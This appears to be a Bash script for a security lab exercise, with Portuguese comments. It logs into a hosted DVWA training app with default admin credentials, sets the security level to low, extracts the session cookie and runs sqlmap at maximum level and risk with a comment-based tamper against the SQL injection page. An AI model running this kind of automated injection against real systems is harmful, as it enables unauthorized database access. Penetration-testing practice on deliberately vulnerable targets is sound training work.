#!/usr/bin/env bash

# Play 03 — Sqlmap DVWA
# Autenticação e análise de SQLi em produção sem interatividade
set -euo pipefail

# Host do DVWA (sem incluir porta)
TARGET_HOST="${DVWA_HOST:-web-dvwa-production.up.railway.app}"

# Determina diretório deste script (compatível com sh/bash)
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
COOKIE_FILE="$SCRIPT_DIR/cookies.txt"

echo "[*] Autenticando no DVWA em https://$TARGET_HOST/login.php..."
# 1. Login e captura cookies (inclui redirect)
curl -ks -c "$COOKIE_FILE" -L \
  -d "username=admin&password=password&Login=Login" \
  "https://$TARGET_HOST/login.php" > /dev/null

echo "[*] Definindo segurança para LOW..."
curl -ks -b "$COOKIE_FILE" -L \
  "https://$TARGET_HOST/security.php?security=low" > /dev/null

# 2. Extrai PHPSESSID do cookie file
echo "[DEBUG] cookies em $COOKIE_FILE:" >&2
cat "$COOKIE_FILE" >&2
PHPSESSID=$(awk '/PHPSESSID/ {print $NF}' "$COOKIE_FILE")
if [ -z "$PHPSESSID" ]; then
  echo "[ERROR] PHPSESSID não encontrado em $COOKIE_FILE" >&2
  exit 1
fi
COOKIE="security=low; PHPSESSID=$PHPSESSID"

# 3. URL de injeção corrigida
INJECTION_URL="https://$TARGET_HOST/vulnerabilities/sqli/?id=1&Submit=Submit"

echo "[*] Iniciando análise SQL Injection com sqlmap contra $INJECTION_URL..."
# Executa sqlmap em modo batch, seguindo redirect e ignorando HTTP 502
time sqlmap \
  --batch \
  --answers="follow=Y" \
  --ignore-code=502 \
  --level=5 \
  --risk=3 \
  --tamper=space2comment \
  -u "$INJECTION_URL" \
  --cookie "$COOKIE"

echo "[✓] Análise SQLi concluída."
